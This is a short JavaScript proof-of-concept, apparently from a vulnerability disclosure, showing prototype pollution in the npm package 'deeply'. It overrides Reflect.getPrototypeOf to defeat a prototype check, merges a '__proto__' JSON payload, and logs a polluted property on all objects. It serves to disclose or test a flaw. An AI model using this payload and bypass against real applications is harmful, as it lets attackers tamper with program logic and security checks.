Reflect.getPrototypeOf = () => false;
const mergeFn = require('deeply');
const payload = '{"__proto__": {"polluted": "yes"}}';
var obj = {};
console.log({}.polluted);
mergeFn({}, JSON.parse(payload));
console.log({}.polluted);